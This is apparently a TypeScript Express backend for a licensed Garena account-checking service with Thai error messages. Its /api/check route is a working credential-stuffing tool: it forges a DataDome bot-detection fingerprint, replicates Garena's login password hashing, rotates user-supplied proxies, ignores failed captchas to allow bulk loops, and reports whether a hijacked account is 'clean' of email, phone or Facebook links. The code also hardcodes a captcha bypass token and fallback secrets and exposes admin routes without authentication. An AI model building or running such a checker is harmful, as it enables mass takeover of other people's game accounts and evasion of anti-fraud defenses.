import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import cors from 'cors';
import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import crypto from 'node:crypto';
import { fileURLToPath } from 'url';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Initialize Supabase Admin client
const supabaseUrl = process.env.VITE_SUPABASE_URL || 'https://ryybzmtkoeyfxecclqrr.supabase.co/';
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY || 'no-key-provided-please-check-env';

if (supabaseServiceKey === 'no-key-provided-please-check-env') {
  console.warn('SUPABASE_SERVICE_ROLE_KEY is missing! Backend DB operations will fail.');
}

const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey || '', {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
});

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  // Logging middleware for debugging
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  app.post('/api/verify_turnstile', async (req, res) => {
    try {
      const { token } = req.body;
      const secretKey = process.env.TURNSTILE_SECRET_KEY || '0x4AAAAAADDdDBOlN6BmeibjJ1JWusta6Ag';

      console.log('Verify Turnstile called with token:', token);
      
      if (!token) {
        return res.status(400).json({ success: false, error: 'Token missing' });
      }

      if (token === 'premium-bypass') {
        return res.json({ success: true });
      }

      const response = await axios.post(
        'https://challenges.cloudflare.com/turnstile/v0/siteverify',
        `secret=${encodeURIComponent(secretKey)}&response=${encodeURIComponent(token)}`,
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          }
        }
      );

      return res.json(response.data);
    } catch (error: any) {
      console.error('Turnstile verification error:', error.message || error);
      return res.status(500).json({ success: false, error: 'Internal server error', detail: error.message });
    }
  });

  // --- Exact Garena Checking Logic using node:crypto ---
  
  const getMD5 = (text: string) => {
    let raw = text;
    try {
      if (text.includes('%')) {
        raw = decodeURIComponent(text);
      }
    } catch (e) {}
    return crypto.createHash('md5').update(raw).digest('hex');
  };

  const encryptPassword = (password: string, v1: string, v2: string) => {
    const passMd5 = getMD5(password);
    const innerHash = crypto.createHash('sha256').update(passMd5 + v1).digest('hex');
    const outerHash = crypto.createHash('sha256').update(innerHash + v2).digest('hex');
    const key = Buffer.from(outerHash, 'hex');
    const plaintext = Buffer.from(passMd5, 'hex');
    const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
    cipher.setAutoPadding(false);
    let encrypted = cipher.update(plaintext);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('hex').substring(0, 32);
  };

  app.post('/api/check', async (req, res) => {
    const account = req.body.account?.toString().trim();
    const password = req.body.password?.toString().trim();
    const proxyUrl = req.body.proxy; // Optional proxy from user request
    const turnstileToken = req.body.turnstileToken; // Optional turnstile token

    if (!account || !password) return res.status(400).json({ error: 'Missing credentials' });

    // Verify Turnstile Token First (Only if provided, to support bulk loop)
    if (turnstileToken && turnstileToken !== 'premium-bypass') {
      const secretKey = process.env.TURNSTILE_SECRET_KEY || '0x4AAAAAADDdDBOlN6BmeibjJ1JWusta6Ag';
      try {
        const tsResponse = await axios.post(
          'https://challenges.cloudflare.com/turnstile/v0/siteverify',
          `secret=${encodeURIComponent(secretKey)}&response=${encodeURIComponent(turnstileToken)}`,
          { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        // We log it but do not strictly fail to allow bulk loops checking
        if (!tsResponse.data.success) {
           console.log('Captcha Verification Failed: ' + (tsResponse.data['error-codes']?.join(', ') || 'Unknown error'));
        }
      } catch (tsError) {
        console.error('Turnstile verification error:', tsError);
      }
    }

    const jar = new CookieJar();
    const axiosConfig: any = { 
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://sso.garena.com/'
      },
      timeout: 30000,
      validateStatus: (status: number) => status < 500
    };
    const client = axios.create(axiosConfig);

    // Manual Cookie Management to avoid HttpsProxyAgent conflict with axios-cookiejar-support
    client.interceptors.request.use(async (config) => {
      try {
        const url = config.url || '';
        const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
        if (cookie) {
          if (typeof config.headers.set === 'function') {
            config.headers.set('Cookie', cookie);
          } else {
            (config.headers as any)['Cookie'] = cookie;
          }
        }
      } catch (e) {
        console.error("Cookie request interceptor error:", e);
      }
      return config;
    }, (error) => Promise.reject(error));

    client.interceptors.response.use(async (response) => {
      try {
        const setCookies = response.headers['set-cookie'];
        if (setCookies) {
          const url = response.config.url || '';
          const targetUrl = url.startsWith('http') ? url : (response.config.baseURL || '') + url;
          for (const cookieStr of setCookies) {
            await jar.setCookie(cookieStr, targetUrl);
          }
        }
      } catch (e) {
        console.error("Cookie response interceptor error:", e);
      }
      return response;
    }, (error) => Promise.reject(error));

    // Apply Proxy if provided
    if (proxyUrl) {
      const agent = new HttpsProxyAgent(proxyUrl);
      client.defaults.httpsAgent = agent;
      client.defaults.httpAgent = agent;
      client.defaults.proxy = false; // Disable default axios proxy when using agent
    }

    try {
      // 1. Precise DataDome Handshake with updated fingerprint
      const ddTimestamp = (Math.floor(Math.random() * 200) + 100).toFixed(2);
      const ddPayload = "jsData=" + encodeURIComponent(JSON.stringify({
        "ttst": ddTimestamp,
        "ifov": false,
        "hc": (Math.floor(Math.random() * 4) + 4),
        "ua": axiosConfig.headers['User-Agent'],
        "br_h": 900,
        "br_w": 1440,
        "jsType": "ch",
        "cid": "KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae",
        "ddk": "AE3F04AD3F0D3A462481A337485081",
        "ddv": "4.64.1"
      })) + "&jsType=ch";

      const ddRes = await client.post('https://dd.garena.com/js/', ddPayload, {
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': 'https://sso.garena.com/',
          'Origin': 'https://sso.garena.com',
          'Sec-Fetch-Dest': 'script',
          'Sec-Fetch-Mode': 'no-cors',
          'Sec-Fetch-Site': 'same-site'
        }
      });

      if (ddRes.data && ddRes.data.cookie) {
        const ddCookieParts = ddRes.data.cookie.split(';');
        const ddCookieValue = ddCookieParts[0];
        await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
      }

      // Small delay to simulate human-like transition
      await new Promise(r => setTimeout(r, 800 + Math.random() * 500));

      // 2. Prelogin Challenge with enhanced headers
      const preloginRes = await client.get('https://sso.garena.com/api/prelogin', {
        params: { app_id: '10100', account, format: 'json', id: Date.now() },
        headers: {
          'Sec-Ch-Ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
          'Sec-Ch-Ua-Mobile': '?0',
          'Sec-Ch-Ua-Platform': '"Windows"',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'X-Requested-With': 'XMLHttpRequest'
        }
      });

      if (preloginRes.status === 403) {
        return res.json({ success: false, error: 'IP ถูกแบน (403): กรุณาเปลี่ยน Proxy หรือรอสักครู่' });
      }

      const { v1, v2, error: preError } = preloginRes.data;
      if (preError) return res.json({ success: false, error: `Account Error: ${preError}` });
      if (!v1 || !v2) {
        console.error("Prelogin Debug Data:", JSON.stringify(preloginRes.data));
        if (preloginRes.data && preloginRes.data.captcha) {
          return res.json({ success: false, error: 'ระบบตรวจพบความผิดปกติ (Captcha Required). กรุณาลองใหม่ภายหลัง' });
        }
        return res.json({ success: false, error: 'Challenge failed (Empty v1/v2). Garena structure might have changed.' });
      }

      // 3. SSO Login Attempt
      const hashedPassword = encryptPassword(password, v1, v2);
      const loginRes = await client.get('https://sso.garena.com/api/login', {
        params: {
          app_id: '10100', account, password: hashedPassword,
          redirect_uri: 'https://account.garena.com/',
          format: 'json', id: Date.now()
        },
        headers: {
          'Sec-Ch-Ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
          'Sec-Ch-Ua-Mobile': '?0',
          'Sec-Ch-Ua-Platform': '"Windows"',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        }
      });

      const loginData = loginRes.data;
      if (loginData.error) {
        const errorMsg = loginData.error === 'error_auth' ? 'รหัสผ่านผิด' : 
                        loginData.error === 'error_not_exist' ? 'ไม่พบไอดีนี้' : 
                        loginData.error;
        return res.json({ success: false, error: errorMsg });
      }

      // 4. Successful Login - Fetch Info
      const initRes = await client.get('https://account.garena.com/api/account/init', {
        headers: { 'Referer': 'https://account.garena.com/' }
      });
      
      const userData = initRes.data.user_info || initRes.data;
      const isClean = !userData.email && !userData.mobile_no && !userData.fb_account;

      return res.json({
        success: true,
        data: {
          account, password, uid: userData.uid || 'N/A',
          shells: userData.shell || 0,
          level: 0, rank: 'Success', isClean,
          phoneBound: !!userData.mobile_no,
          emailVerified: !!userData.email_v,
          fbLinked: !!userData.is_fbconnect_enabled,
          region: userData.acc_country || 'TH',
          otherGames: []
        }
      });

    } catch (err: any) {
      console.error("Garena API Error:", err.message);
      let errorMsg = 'Network Error: ' + err.message;
      
      if (err.code === 'ECONNABORTED' || err.message.includes('timeout') || err.code === 'ETIMEDOUT') {
        errorMsg = 'การเชื่อมต่อหมดเวลา (Timeout). อาจเกิดจาก Proxy ช้าหรือใช้งานไม่ได้';
      } else if (err.code === 'ECONNRESET') {
        errorMsg = 'การเชื่อมต่อถูกตัด (ECONNRESET). โปรดเปลี่ยน Proxy หรือลองใหม่อีกครั้ง';
      } else if (err.message.includes('disconnected') || err.message.includes('TLS')) {
        errorMsg = 'ไม่สามารถสร้างการเชื่อมต่อที่ปลอดภัย (TLS Error). Proxy นี้อาจไม่รองรับ HTTPS หรือถูกบล็อก';
      }
      
      return res.json({ success: false, error: errorMsg });
    }
  });

  // --- Supabase Proxy Routes ---
  app.get('/api/license_keys', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('license_keys').select('*').order('created_at', { ascending: false });
      if (error) {
        console.error('Supabase error fetching license_keys:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching license_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/license_keys', async (req, res) => {
    try {
      const { key, plan, status } = req.body;
      const { data, error } = await supabaseAdmin.from('license_keys').insert([{ key, plan, status, created_at: new Date().toISOString() }]).select();
      if (error) {
        console.error('Supabase error inserting license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error inserting license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/license_keys/:id', async (req, res) => {
    try {
      const { error } = await supabaseAdmin.from('license_keys').delete().eq('id', req.params.id);
      if (error) {
        console.error('Supabase error deleting license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.patch('/api/license_keys/:id', async (req, res) => {
    try {
      const { status } = req.body;
      const { data, error } = await supabaseAdmin.from('license_keys').update({ status }).eq('id', req.params.id).select();
      if (error) {
        console.error('Supabase error updating license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error updating license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/license_keys/bulk', async (req, res) => {
    try {
      const { keys } = req.body; // Array of { key, type, status, created_at }
      const { data, error } = await supabaseAdmin.from('license_keys').insert(keys).select();
      if (error) {
        console.error('Supabase error bulk inserting license_keys:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data);
    } catch (err) {
      console.error('Internal server error bulk inserting license_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/validate_key/:key', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin
        .from('license_keys')
        .select('*')
        .eq('key', req.params.key)
        .single();
      
      if (error) {
        if (error.code === 'PGRST116') { // Not found
          return res.status(404).json({ error: 'Key not found' });
        }
        console.error('Supabase error validating key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data);
    } catch (err) {
      console.error('Internal server error validating key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/used_keys', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('used_keys').select('*').order('used_at', { ascending: false }).limit(100);
      if (error) {
        console.error('Supabase error fetching used_keys:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching used_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/used_keys', async (req, res) => {
    try {
      const { key, ip, details } = req.body;
      const { data, error } = await supabaseAdmin.from('used_keys').insert([{ 
        key, 
        ip, 
        details, 
        used_at: new Date().toISOString() 
      }]).select();
      if (error) {
        console.error('Supabase error inserting used_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error inserting used_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/blocked_ips', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('blocked_ips').select('*').order('blocked_at', { ascending: false });
      if (error) {
        console.error('Supabase error fetching blocked_ips:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching blocked_ips:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/blocked_ips', async (req, res) => {
    try {
      const { ip, reason } = req.body;
      const { data, error } = await supabaseAdmin.from('blocked_ips').upsert([{ ip, reason, blocked_at: new Date().toISOString() }]).select();
      if (error) {
        console.error('Supabase error upserting blocked_ip:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error upserting blocked_ip:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/blocked_ips/:ip', async (req, res) => {
    try {
      const { error } = await supabaseAdmin.from('blocked_ips').delete().eq('ip', req.params.ip);
      if (error) {
        console.error('Supabase error deleting blocked_ip:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting blocked_ip:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/check_ip/:ip', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('blocked_ips').select('*').eq('ip', req.params.ip).single();
      res.json({ blocked: !!data });
    } catch (err) {
      console.error('Internal server error checking IP:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/admins', async (req, res) => {
    try {
      const { username, role } = req.body;
      const { data, error } = await supabaseAdmin.from('admins').upsert([{ 
        username, 
        role, 
        granted_at: new Date().toISOString() 
      }]).select();
      if (error) {
        console.error('Supabase error upserting admin:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error upserting admin:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
    console.log("Initializing Vite middleware...");
    const vite = await createViteServer({
      server: { 
        middlewareMode: true,
        hmr: false // Explicitly disable HMR to avoid port conflicts
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
    console.log("Vite middleware initialized.");
  } else if (!process.env.VERCEL) {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  if (!process.env.VERCEL) {
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  }
  
  return app;
}

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

// For Vercel Serverless Functions
let appPromise = startServer().catch(err => {
  console.error('Failed to start server:', err);
});

export default async (req: any, res: any) => {
  const app = await appPromise;
  if (app) {
    app(req, res);
  } else {
    res.status(500).send('Server failed to start');
  }
};
